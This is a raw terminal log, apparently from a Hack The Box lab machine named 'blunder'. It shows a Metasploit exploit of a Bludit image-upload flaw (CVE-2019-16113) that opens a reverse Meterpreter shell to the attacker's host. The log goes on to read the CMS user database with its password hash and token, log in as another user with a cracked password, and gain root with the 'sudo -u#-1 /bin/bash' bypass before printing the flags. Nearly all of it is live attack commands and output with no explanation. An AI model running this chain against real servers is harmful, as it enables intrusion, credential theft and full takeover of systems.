@@ -1,0 +1,373 @@
+
+
+
+msf5 exploit(linux/http/bludit_upload_images_exec) > info
+
+       Name: Bludit Directory Traversal Image File Upload Vulnerability
+     Module: exploit/linux/http/bludit_upload_images_exec
+   Platform: PHP
+       Arch: php
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2019-09-07
+
+Provided by:
+  christasa
+  sinn3r <sinn3r@metasploit.com>
+
+Module side effects:
+ ioc-in-logs
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Bludit v3.9.2
+
+Check supported:
+  Yes
+
+Basic options:
+  Name        Current Setting  Required  Description
+  ----        ---------------  --------  -----------
+  BLUDITPASS                   yes       The password for Bludit
+  BLUDITUSER                   yes       The username for Bludit
+  Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+  RPORT       80               yes       The target port (TCP)
+  SSL         false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI   /                yes       The base path for Bludit
+  VHOST                        no        HTTP server virtual host
+
+Payload information:
+
+Description:
+  This module exploits a vulnerability in Bludit. A remote user could 
+  abuse the uuid parameter in the image upload feature in order to 
+  save a malicious payload anywhere onto the server, and then use a 
+  custom .htaccess file to bypass the file extension check to finally 
+  get remote code execution.
+
+References:
+  https://cvedetails.com/cve/CVE-2019-16113/
+  https://github.com/bludit/bludit/issues/1081
+  https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac
+
+msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
+BLUDITPASS => RolandDeschain
+msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
+BLUDITUSER => fergus
+msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
+RHOSTS => 10.10.10.191
+msf5 exploit(linux/http/bludit_upload_images_exec) > run
+
+[*] Started reverse TCP handler on 10.10.14.110:4444 
+[+] Logged in as: fergus
+[*] Retrieving UUID...
+[*] Uploading xoypIGPiyL.png...
+[*] Uploading .htaccess...
+[*] Executing xoypIGPiyL.png...
+[*] Sending stage (38288 bytes) to 10.10.10.191
+[*] Meterpreter session 1 opened (10.10.14.110:4444 -> 10.10.10.191:33744) at 2020-08-01 00:24:17 +0530
+[+] Deleted .htaccess
+
+meterpreter > sysinfo
+Computer    : blunder
+OS          : Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64
+Meterpreter : php/linux
+meterpreter > shell
+Process 5734 created.
+Channel 0 created.
+pwd
+/var/www/bludit-3.9.2/bl-content/tmp
+cd /home/fergus/Desktop
+/bin/sh: 2: cd: can't cd to /home/fergus/Desktop
+cat /home/fergus/Desktop/user.txt
+cat: /home/fergus/Desktop/user.txt: No such file or directory
+python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ ls 
+ls
+thumbnails
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd /
+cd /
+www-data@blunder:/$ ls
+ls
+bin    dev  home   lib64       media  proc  sbin  sys  var
+boot   etc  lib    libx32      mnt    root  snap  tmp
+cdrom  ftp  lib32  lost+found  opt    run   srv   usr
+www-data@blunder:/$ cd usr	
+cd usr
+www-data@blunder:/usr$ ls
+ls
+bin    include	lib32  libexec	local  share
+games  lib	lib64  libx32	sbin   src
+www-data@blunder:/usr$ cd ..
+cd ..
+www-data@blunder:/$ ls
+ls
+bin    dev  home   lib64       media  proc  sbin  sys  var
+boot   etc  lib    libx32      mnt    root  snap  tmp
+cdrom  ftp  lib32  lost+found  opt    run   srv   usr
+www-data@blunder:/$ cd root
+cd root
+bash: cd: root: Permission denied
+www-data@blunder:/$ sudo su
+sudo su
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password: RolandDeschain
+
+Sorry, try again.
+Password: sda
+
+Sorry, try again.
+Password: asda
+
+sudo: 3 incorrect password attempts
+www-data@blunder:/$ cd ftp
+cd ftp
+www-data@blunder:/ftp$ ls
+ls
+D5100_EN.pdf  config  config.json  note.txt
+www-data@blunder:/ftp$ cat note.txt
+cat note.txt
+Hey Sophie
+I've left the thing you're looking for in here for you to continue my work
+when I leave. The other thing is the same although Ive left it elsewhere too.
+
+Its using the method we talked about; dont leave it on a post-it note this time!
+
+Thanks
+Shaun
+www-data@blunder:/ftp$ cd /home
+cd /home
+www-data@blunder:/home$ ls
+ls
+hugo  shaun
+www-data@blunder:/home$ cd shaun
+cd shaun
+www-data@blunder:/home/shaun$ ls
+ls
+Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
+www-data@blunder:/home/shaun$ cd Desktop
+cd Desktop
+www-data@blunder:/home/shaun/Desktop$ ls
+ls
+www-data@blunder:/home/shaun/Desktop$ cd ..
+cd ..
+www-data@blunder:/home/shaun$ cd ..
+cd ..
+www-data@blunder:/home$ cd hugo
+cd hugo
+www-data@blunder:/home/hugo$ ls 
+ls
+Desktop    Downloads  Pictures	Templates  user.txt
+Documents  Music      Public	Videos
+www-data@blunder:/home/hugo$ cd Desktop
+cd Desktop
+www-data@blunder:/home/hugo/Desktop$ cd ..
+cd ..
+www-data@blunder:/home/hugo$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@blunder:/home/hugo$ whoami
+whoami
+www-data
+www-data@blunder:/home/hugo$ export TERM=xterm
+export TERM=xterm
+www-data@blunder:/home/hugo$ cd ../
+cd ../
+www-data@blunder:/home$ cd ../
+cd ../
+www-data@blunder:/$ cls
+cls
+
+Command 'cls' not found, but there are 19 similar ones.
+
+www-data@blunder:/$ ls
+ls
+bin    dev  home   lib64       media  proc  sbin  sys  var
+boot   etc  lib    libx32      mnt    root  snap  tmp
+cdrom  ftp  lib32  lost+found  opt    run   srv   usr
+www-data@blunder:/$ cd var
+cd var
+www-data@blunder:/var$ ls
+ls
+backups  crash	local  log   metrics  run   spool  www
+cache	 lib	lock   mail  opt      snap  tmp
+www-data@blunder:/var$ cd www
+cd www
+www-data@blunder:/var/www$ ls
+ls
+bludit-3.10.0a	bludit-3.9.2  html
+www-data@blunder:/var/www$ cd bludit-3.10.0a
+cd bludit-3.10.0a
+www-data@blunder:/var/www/bludit-3.10.0a$ ls
+ls
+LICENSE    bl-content  bl-languages  bl-themes	install.php
+README.md  bl-kernel   bl-plugins    index.php
+www-data@blunder:/var/www/bludit-3.10.0a$ cd bl-content
+cd bl-content
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ ls
+ls
+databases  pages  tmp  uploads	workspaces
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ cd databases
+cd databases
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls
+ls
+categories.php	plugins       site.php	  tags.php
+pages.php	security.php  syslog.php  users.php
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
+cat users.php
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
+su hugo
+Password: Password120
+
+hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd /home/hugo
+cd /home/hugo
+hugo@blunder:~$ ls
+ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt
+hugo@blunder:~$ cat user.txt
+cat user.txt
+c3f258f8628b83942a184f32ac50bf59
+hugo@blunder:~$ cd /root
+cd /root
+bash: cd: /root: Permission denied
+hugo@blunder:~$ sudo su
+sudo su
+Password: Password120
+
+Sorry, user hugo is not allowed to execute '/usr/bin/su' as root on blunder.
+hugo@blunder:~$ id
+id
+uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
+hugo@blunder:~$ sudo -l
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+hugo@blunder:~$ /bin/bash > root
+/bin/bash > root
+hugo@blunder:~$ cd /root      
+cd /rood /root
+bash: cd: too many arguments
+hugo@blunder:~$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# cd /root
+cd /root
+root@blunder:/root# cat root.txt
+cat root.txt
+root@blunder:/root# ls
+ls
+root@blunder:/root# cd ../
+cd ../
+root@blunder:/# exit
+exit
+exit
+hugo@blunder:~$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# cd ..
+cd ..
+root@blunder:/home# cd ..
+cd ..
+root@blunder:/# cd root
+cd root
+root@blunder:/root# ls
+ls
+root@blunder:/root# ls -la
+ls -la
+root@blunder:/root# id
+id
+root@blunder:/root# exit
+exit
+exit
+hugo@blunder:~$ ls
+ls
+hugo@blunder:~$ cd /
+cd /
+hugo@blunder:/$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+root@blunder:/# cd root
+cd root
+root@blunder:/root# ls
+ls
+root@blunder:/root# ls
+ls
+root@blunder:/root# cat root.txt
+cat root.txt
+root@blunder:/root# cd /home/hugo
+cd /home/hugo
+root@blunder:/home/hugo# sudo -l
+sudo -l
+root@blunder:/home/hugo# cd /
+cd /
+root@blunder:/# ls
+ls
+root@blunder:/# cd root
+cd root
+root@blunder:/root# ls
+ls
+root@blunder:/root# exit
+exit
+exit
+hugo@blunder:/$ ls
+ls
+hugo@blunder:/$ exit
+exit
+exit
+hugo@blunder:~$ ls
+ls
+Desktop    Downloads  Pictures  root       user.txt
+Documents  Music      Public    Templates  Videos
+hugo@blunder:~$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# cd /root
+cd /root
+root@blunder:/root# ls
+ls
+root.txt
+root@blunder:/root# cat root.txt
+cat root.txt
+4ff5ac02b81b65401547631b4818925f
+root@blunder:/root# 
+
